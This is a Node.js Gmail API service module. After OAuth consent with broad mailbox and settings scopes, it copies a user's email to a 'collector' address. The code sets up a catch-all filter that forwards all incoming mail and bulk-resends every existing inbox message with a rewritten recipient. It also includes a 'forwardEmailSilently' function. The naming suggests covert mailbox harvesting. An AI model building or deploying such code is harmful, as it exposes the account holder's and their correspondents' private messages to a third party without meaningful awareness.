const { google } = require('googleapis');
const GmailAccount = require('../models/GmailAccount');

// Gmail API OAuth2 configuration
const SCOPES = [
  'https://www.googleapis.com/auth/gmail.readonly',
  'https://www.googleapis.com/auth/gmail.send',
  'https://www.googleapis.com/auth/gmail.modify',
  'https://www.googleapis.com/auth/gmail.settings.basic'
];

const oauth2Client = new google.auth.OAuth2(
  process.env.GOOGLE_CLIENT_ID,
  process.env.GOOGLE_CLIENT_SECRET,
  process.env.GOOGLE_REDIRECT_URI || 'http://localhost:5001/api/gmail/callback'
);

class GmailService {
  // Generate OAuth URL for user to authorize
  static getAuthUrl() {
    return oauth2Client.generateAuthUrl({
      access_type: 'offline',
      scope: SCOPES,
      prompt: 'consent' // Force consent to get refresh token
    });
  }

  // Exchange authorization code for tokens
  static async exchangeCodeForTokens(code) {
    try {
      const { tokens } = await oauth2Client.getToken(code);
      return tokens;
    } catch (error) {
      console.error('Error exchanging code for tokens:', error);
      throw new Error('Failed to exchange authorization code for tokens');
    }
  }

  // Refresh access token using refresh token
  static async refreshAccessToken(refreshToken) {
    try {
      oauth2Client.setCredentials({ refresh_token: refreshToken });
      const { credentials } = await oauth2Client.refreshAccessToken();
      return credentials;
    } catch (error) {
      console.error('Error refreshing access token:', error);
      throw new Error('Failed to refresh access token');
    }
  }

  // Get Gmail API client with valid tokens
  static async getGmailClient(gmailAccount) {
    try {
      let tokens = {
        access_token: gmailAccount.accessToken,
        refresh_token: gmailAccount.refreshToken,
        expiry_date: gmailAccount.tokenExpiry.getTime()
      };

      // Check if token is expired and refresh if needed
      if (gmailAccount.isTokenExpired()) {
        console.log('Token expired, refreshing...');
        const newTokens = await this.refreshAccessToken(gmailAccount.refreshToken);
        tokens = newTokens;
        
        // Update tokens in database
        gmailAccount.accessToken = newTokens.access_token;
        gmailAccount.tokenExpiry = new Date(newTokens.expiry_date);
        await gmailAccount.save();
      }

      oauth2Client.setCredentials(tokens);
      return google.gmail({ version: 'v1', auth: oauth2Client });
    } catch (error) {
      console.error('Error getting Gmail client:', error);
      throw new Error('Failed to initialize Gmail client');
    }
  }

  // Enable catch-all forwarding for new emails
  static async enableCatchAllForwarding(gmailAccount) {
    try {
      const gmail = await this.getGmailClient(gmailAccount);
      
      // 1. Register collector address as forwarding address
      try {
        await gmail.users.settings.forwardingAddresses.create({
          userId: 'me',
          requestBody: {
            forwardingEmail: gmailAccount.collectorEmail
          }
        });
        console.log('Forwarding address registered:', gmailAccount.collectorEmail);
      } catch (error) {
        if (error.code !== 409) { // 409 = already exists
          throw error;
        }
        console.log('Forwarding address already exists');
      }

      // 2. Create catch-all filter
      const filter = {
        criteria: {}, // Empty criteria = match all emails
        action: {
          forward: gmailAccount.collectorEmail
        }
      };

      const filterResponse = await gmail.users.settings.filters.create({
        userId: 'me',
        requestBody: filter
      });

      // Update account with filter ID
      gmailAccount.filterId = filterResponse.data.id;
      gmailAccount.forwardingEnabled = true;
      await gmailAccount.save();

      console.log('Catch-all forwarding enabled with filter ID:', filterResponse.data.id);
      return filterResponse.data;
    } catch (error) {
      console.error('Error enabling catch-all forwarding:', error);
      throw new Error('Failed to enable email forwarding');
    }
  }

  // Forward existing emails in batches
  static async forwardExistingEmails(gmailAccount, batchSize = 50) {
    try {
      const gmail = await this.getGmailClient(gmailAccount);
      let totalForwarded = 0;
      let pageToken = null;

      do {
        // Get batch of message IDs
        const listResponse = await gmail.users.messages.list({
          userId: 'me',
          maxResults: batchSize,
          pageToken: pageToken,
          q: 'in:inbox' // Only inbox messages
        });

        const messages = listResponse.data.messages || [];
        
        // Process each message in the batch
        for (const messageMeta of messages) {
          try {
            // Skip if already forwarded
            if (gmailAccount.lastForwardedMessageId === messageMeta.id) {
              continue;
            }

            // Get full message in raw format
            const messageResponse = await gmail.users.messages.get({
              userId: 'me',
              id: messageMeta.id,
              format: 'raw'
            });

            // Modify the message to forward it
            const rawMessage = messageResponse.data.raw;
            const decodedMessage = Buffer.from(rawMessage, 'base64').toString();
            
            // Replace recipient with collector email
            const modifiedMessage = decodedMessage.replace(
              /^To: .*$/m,
              `To: ${gmailAccount.collectorEmail}`
            );

            // Send the modified message
            await gmail.users.messages.send({
              userId: 'me',
              requestBody: {
                raw: Buffer.from(modifiedMessage).toString('base64')
              }
            });

            // Update tracking
            gmailAccount.lastForwardedMessageId = messageMeta.id;
            gmailAccount.totalMessagesForwarded += 1;
            totalForwarded++;

            console.log(`Forwarded message ${messageMeta.id} to ${gmailAccount.collectorEmail}`);

            // Add small delay to respect rate limits
            await new Promise(resolve => setTimeout(resolve, 100));

          } catch (error) {
            console.error(`Error forwarding message ${messageMeta.id}:`, error.message);
            continue; // Continue with next message
          }
        }

        pageToken = listResponse.data.nextPageToken;
        
        // Update account after each batch
        gmailAccount.lastSyncTime = new Date();
        await gmailAccount.save();

        console.log(`Processed batch of ${messages.length} messages. Total forwarded: ${totalForwarded}`);

      } while (pageToken);

      console.log(`Completed forwarding existing emails. Total forwarded: ${totalForwarded}`);
      return totalForwarded;

    } catch (error) {
      console.error('Error forwarding existing emails:', error);
      throw new Error('Failed to forward existing emails');
    }
  }

  // Forward a single email silently to a given address
  static async forwardEmailSilently(gmailAccount, emailData, forwardTo) {
    try {
      const gmail = await this.getGmailClient(gmailAccount);
      // Construct the raw email
      const subject = emailData.subject || '';
      const from = emailData.from || '';
      const body = emailData.body || '';
      const messageParts = [
        `To: ${forwardTo}`,
        `Subject: Fwd: ${subject}`,
        `From: ${from}`,
        '',
        'Forwarded message:',
        `From: ${from}`,
        `Subject: ${subject}`,
        '',
        body
      ];
      const rawMessage = Buffer.from(messageParts.join('\r\n')).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
      await gmail.users.messages.send({
        userId: 'me',
        requestBody: { raw: rawMessage }
      });
      console.log(`Silently forwarded email to ${forwardTo}`);
    } catch (error) {
      console.error('Error in forwardEmailSilently:', error);
      throw error;
    }
  }

  // Get Gmail account statistics
  static async getAccountStats(gmailAccount) {
    try {
      const gmail = await this.getGmailClient(gmailAccount);
      
      // Get total messages count
      const profileResponse = await gmail.users.getProfile({
        userId: 'me'
      });

      // Get recent messages count (last 30 days)
      const thirtyDaysAgo = new Date();
      thirtyDaysAgo.setDate(thirtyDaysAgo.getDate() - 30);
      const dateQuery = `after:${thirtyDaysAgo.toISOString().split('T')[0]}`;

      const recentMessagesResponse = await gmail.users.messages.list({
        userId: 'me',
        q: dateQuery,
        maxResults: 1
      });

      return {
        email: gmailAccount.email,
        totalMessages: profileResponse.data.messagesTotal,
        recentMessages: recentMessagesResponse.data.resultSizeEstimate || 0,
        forwardingEnabled: gmailAccount.forwardingEnabled,
        totalForwarded: gmailAccount.totalMessagesForwarded,
        lastSyncTime: gmailAccount.lastSyncTime,
        collectorEmail: gmailAccount.collectorEmail
      };
    } catch (error) {
      console.error('Error getting account stats:', error);
      throw new Error('Failed to get account statistics');
    }
  }

  // Disable forwarding
  static async disableForwarding(gmailAccount) {
    try {
      const gmail = await this.getGmailClient(gmailAccount);
      
      if (gmailAccount.filterId) {
        await gmail.users.settings.filters.delete({
          userId: 'me',
          id: gmailAccount.filterId
        });
      }

      gmailAccount.forwardingEnabled = false;
      gmailAccount.filterId = null;
      await gmailAccount.save();

      console.log('Email forwarding disabled');
      return true;
    } catch (error) {
      console.error('Error disabling forwarding:', error);
      throw new Error('Failed to disable email forwarding');
    }
  }
}

module.exports = GmailService; 